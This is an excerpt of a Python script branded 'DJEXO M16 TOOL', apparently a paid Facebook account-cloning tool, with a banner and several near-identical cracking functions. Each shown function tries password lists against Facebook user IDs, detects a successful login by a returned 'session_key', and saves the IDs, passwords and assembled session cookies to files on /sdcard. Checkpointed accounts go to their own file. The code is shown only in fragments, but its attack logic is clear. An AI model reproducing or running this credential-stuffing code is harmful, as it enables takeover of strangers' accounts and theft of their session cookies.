...
print('\033[1;32m[\033[1;31m-\033[1;32m] \033[1;32mWELLCOM TO DJEXO M16 TOOL...')
...
sys.stdout.write('\x1b]2; <[DJEXO-M16]>\x07')
logo=(f"""\033[1;37m
\033[1;32m[\033[1;31m-\033[1;32m] \033[1;8888b.   88888 888888 Yb  dP  dP"Yb  
 8I  Yb     88 88__    YbdP  dP   Yb 
 8I  dY o.  88 88""    dPYb  Yb   dP 
8888Y"  "bodP' 888888 dP  Yb  YbodP  34m══════════════════════════════════════════════════
\033[1;32m[\033[1;31m-\033[1;32m] \033[1;32mFACEBOK : \033[1;37mX.A.Moha 
\033[1;32m[\033[1;31m-\033[1;32m] \033[1;32mGITHUB  : \033[1;37mDJEXO-2
\033[1;32m[\033[1;31m-\033[1;32m] \033[1;32mSERVICE : \033[1;37mPAID
\033[1;32m[\033[1;31m-\033[1;32m] \033[1;32mVERSION : \033[1;37m3.21
\033[1;34m═════════════════════════════════════════
\033[1;32m[\033[1;31m-\033[1;32m] \033[1;31mCloning ids Saved in DJEXO folder
\033[1;34m═════════════════════════════════════════""")
def linex():
    print('\033[1;34m═════════════════════════════════════════')
def clear():
...
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m<[DJEXO-M1]>×<[%s|\033[1;32mOK:-%s\033[1;37m]> \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m<[DJEXO-OK]> '+ids+' | '+pas+'\033[1;97m')                 
                                        print("\033[1;33m [BISCUT-🇩🇿] :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/DJEXO_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/MAFIA_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                      
                                        oks.append(ids)                           
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m<[DJEXO-CP]> '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/DJEXO-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/DJEXO-CP.txt','a').write(ids+'|'+pas+'\n')
...
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m<[DJEXO-M2]>×<[%s|\033[1;32mOK:-%s\033[1;37m]> \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m<[DJEXO-OK]> '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m') 
                                        print("\033[1;96m [BISCUT-🇩🇿] :\033[1;37m "+cookie)           
                                        open('/sdcard/DJEXO_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/DJEXO_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)                                        
                                        break
...
def M3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m<[DJEXO-M3]>×<[%s|\033[1;32mOK:-%s\033[1;37m]> \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m <[DJEXO-OK]> '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')            
                                        open('/sdcard/DJEXO_m3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/DJEXO_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)                                        
                                        break
...
def M4(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m<[DJEXO-M4]>×<[%s|\033[1;32mOK:-%s\033[1;37m]> \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
...
'Content-Length': '706'}
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m <[DJEXO-OK]> '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')            
                                        open('/sdcard/DJEXO_m4_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/DJEXO_iDs_COOKiE_M4.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                       
                                        oks.append(ids)              
                                        break                                                                         
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
